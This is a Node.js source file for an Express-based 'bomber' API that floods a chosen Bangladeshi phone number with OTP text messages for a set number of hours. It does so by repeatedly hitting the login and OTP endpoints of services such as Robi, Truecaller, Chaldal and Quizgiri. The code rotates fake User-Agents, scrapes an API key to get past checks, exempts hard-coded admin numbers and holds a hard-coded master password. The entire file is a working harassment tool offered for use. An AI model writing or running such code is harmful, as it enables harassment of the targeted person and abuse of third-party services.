#!/usr/bin/env node
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const express = require("express"); // Added express for better routing

const app = express();
const PORT = process.env.PORT || 3000;

const admin = ["01882030871", "01518931383"];

// Random User-Agent generator
function randomUserAgent() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1"
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

// Sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Load config
const configPath = path.join(__dirname, "config.json");
let config = { targets: [] };
if (fs.existsSync(configPath)) {
  config = JSON.parse(fs.readFileSync(configPath, "utf8"));
}

// History file
const historyPath = path.join(__dirname, "history.json");
let history = [];
if (fs.existsSync(historyPath)) {
  try {
    history = JSON.parse(fs.readFileSync(historyPath, "utf8"));
  } catch (e) {
    console.log("Error loading history, starting fresh");
  }
}

// Prepare target with dynamic keys
async function prepareTarget(target) {
  if (target.name === "Quizgiri") {
    try {
      const res = await axios.get("https://app.quizgiri.com.bd/");
      const match = res.data.match(/x-api-key\s*=\s*"(.+?)"/);
      if (match) target.headers["x-api-key"] = match[1];
    } catch {}
  }
}

// Send request
async function sendRequest(target, number, bomberData) {
  try {




    if (target.name === "Robi") {
  const body = [
    { msisdn: number }
  ];

  const url = target.base + target.route;

  const res = await axios.post(url, body, {
    headers: {
      ...(target.headers || {}),
      "User-Agent": randomUserAgent()
    },
    validateStatus: () => true
  });

  if (res.status >= 200 && res.status < 300) {
    console.log(`[✔] ${target.name} → OTP sent to ${number}`);
  } else if (res.status === 429) {
    console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
  } else {
    console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
  }
  return;
}


    if (target.name === "Truecaller") {
  const body = {
    phone: parseInt("88" + number),  // phone number integer আকারে
    countryCode: "bd"
  };

  const url = target.base + target.route;

  const res = await axios.post(url, body, {
    headers: {
      ...(target.headers || {}),
      "User-Agent": randomUserAgent()
    },
    validateStatus: () => true
  });

  if (res.status >= 200 && res.status < 300) {
    console.log(`[✔] ${target.name} → OTP sent to ${number}`);
  } else if (res.status === 429) {
    console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
  } else {
    console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
  }
  return;
}


    if (target.name === "Chaldal") {
      const queryParams = {};
      for (const key in target.queryParamsTemplate) {
        queryParams[key] = target.queryParamsTemplate[key].replace("__NUMBER__", number);
      }
      const url = target.base + "?" + new URLSearchParams(queryParams).toString();

      const startTime = Date.now();
      const res = await axios.post(url, {}, { headers: target.headers });
      const ping = Date.now() - startTime;
      if (res.status >= 200 && res.status < 300) {
        console.log(`[✔] ${target.name} → OTP sent to ${number}`);
        bomberData.totalSent++;
        bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
        bomberData.lastPing = ping;
      } else {
        console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
        if (res.status !== 429) {
          bomberData.failuresPerTarget[target.name] = (bomberData.failuresPerTarget[target.name] || 0) + 1;
        }
      }
      return;
    }

    await prepareTarget(target);

    let url = target.base + (target.route || "");
    let body = {};

    if (target.type === "GET") {
      if (target.queryParam) {
        url += "?" + new URLSearchParams({ [target.queryParam]: number }).toString();
      } else {
        url += number;
      }
    }

    if (target.type === "POST" && target.bodyTemplate) {
      body = JSON.parse(JSON.stringify(target.bodyTemplate).replace(/__NUMBER__/g, number));
    }

    const startTime = Date.now();
    const res = await axios({
      method: target.type,
      url,
      headers: {
        ...(target.headers || {}),
        "User-Agent": randomUserAgent(),
        "x-request-id": Math.random().toString(36).substring(2, 12)
      },
      data: body,
      validateStatus: () => true
    });
    const ping = Date.now() - startTime;

    if (res.status >= 200 && res.status < 300) {
      console.log(`[✔] ${target.name} → OTP sent to ${number}`);
      bomberData.totalSent++;
      bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
      bomberData.lastPing = ping;
    } else if (res.status === 429) {
      console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
    } else {
      console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
      bomberData.failuresPerTarget[target.name] = (bomberData.failuresPerTarget[target.name] || 0) + 1;
    }
  } catch (err) {
    console.log(`[ERROR] ${target.name} Exception → ${number} | ${err.message}`);
  }
}

// Bomber main function
let activeBombers = {};

async function bomber(number, hours, password) {
  const endTime = Date.now() + hours * 60 * 60 * 1000;
  activeBombers[number] = {
    active: true,
    password,
    startTime: Date.now(),
    endTime,
    totalSent: 0,
    attempts: 0,
    successesPerTarget: {},
    failuresPerTarget: {},
    lastPing: 0
  };

  let attempt = 0;
  while (Date.now() < endTime && activeBombers[number] && activeBombers[number].active) {
    attempt++;
    console.log(`\n📌 Attempt #${attempt}`);
    activeBombers[number].attempts = attempt;
    for (const target of config.targets) {
      if (activeBombers[number] && activeBombers[number].active) {
        await sendRequest(target, number, activeBombers[number]);
        await sleep(1000);
      }
    }
  }
  
  if (activeBombers[number]) {
    const data = { ...activeBombers[number], number, endTime: Date.now() };
    delete data.active;
    delete data.password;
    history.push(data);
    fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
    delete activeBombers[number];
  }
}

// API meta
const meta = {
  name: "start",
  version: "1.0.0",
  description: "Start bomber attack on a number",
  author: "Ove",
  method: "get",
  category: "bomber",
  path: "/start?number=&time=&password="
};

// API handlers
async function onStart(req, res) {
  const { number, time, password } = req.query;

  if (!number || !time || !password) {
    return res.json({ error: "Missing parameters. Use ?number=&time=&password=" });
  }

  if (!number.startsWith("01") || number.length !== 11) {
    return res.json({ error: "Invalid number. Must be 11 digits starting with 01" });
  }

  if (admin.includes(number)) {
    return res.json({ error: "This number is protected (admin)" });
  }

  if (activeBombers[number]) {
    return res.json({ error: "Bomber already running on this number" });
  }

  bomber(number, parseInt(time), password);
  return res.json({
    message: `Bomber started on ${number} for ${time} hour(s)`,
    powered_by: "Wataru API"
  });
}

async function onStatus(req, res) {
  const bombers = {};
  for (const num in activeBombers) {
    const data = { ...activeBombers[num] };
    delete data.active;
    delete data.password;
    bombers[num] = data;
  }
  res.json(bombers);
}

async function onStop(req, res) {
  const { number, password, master } = req.query;

  if (!number || !password) {
    return res.json({ error: "Missing parameters. Use ?number=&password=" });
  }

  if (!activeBombers[number]) {
    return res.json({ error: "No bomber running on this number" });
  }

  if (activeBombers[number].password !== password && !(master === 'true' && password === 'alit')) {
    return res.json({ error: "Incorrect password" });
  }

  activeBombers[number].active = false;
  const data = { ...activeBombers[number], number, endTime: Date.now() };
  delete data.active;
  delete data.password;
  history.push(data);
  fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
  delete activeBombers[number];
  return res.json({ message: `Bomber stopped for ${number}` });
}

async function onHistory(req, res) {
  res.json(history);
}


function onDashboard(req, res) {
    res.sendFile(path.join(__dirname, 'boom.html'));
}

  

// Set up express server if running directly



module.exports = { meta, onStart, onStatus, onStop, onHistory, onDashboard };
